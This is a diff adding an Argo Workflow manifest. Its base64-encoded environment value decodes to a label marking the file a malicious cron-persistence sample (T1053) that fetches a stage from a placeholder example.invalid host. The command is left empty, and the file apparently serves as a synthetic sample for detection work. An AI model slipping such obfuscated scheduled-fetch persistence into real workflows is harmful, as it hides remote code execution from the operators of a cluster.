@@ -1,0 +1,19 @@
+apiVersion: argoproj.io/v1alpha1
+kind: Workflow
+spec:
+  templates:
+    - name: main
+      container:
+        image: alpine:3
+        env:
+          - name: DESCRIPTOR_0b7e6d93
+            value: dj0zfGxhbmd1YWdlPWFyZ29feWFtbHxyb2xlPXBlcnNpc3RlbmNlfHZl
+              cmRpY3Q9bWFsaWNpb3VzfGF0dGFjaz1UMTA1M3xhZGFwdGVyPXdvcmtm
+              bG93X2Nyb258aG9zdF9wcm9maWxlPWs4c19lbnZ8c3RhZ2VfY291bnQ9
+              MnxzdGVwcz1yZWdpc3Rlcl9zY2hlZHVsZSxydW5fc3RhZ2V8Y2FtcGFp
+              Z25faWQ9WUMtMGI3ZTZkOTN8dXJsPWh0dHBzOi8veWMtMGI3ZTZkOTMu
+              ZXhhbXBsZS5pbnZhbGlkL3N0YWdlfGZpbGVfcGF0aD0vdG1wL2h1bnRy
+              ZXNzLXljLy4wYjdlNmQ5My5zdGFnZQ==
+          - name: MODE
+            value: fast
+        command: [sh, -c]
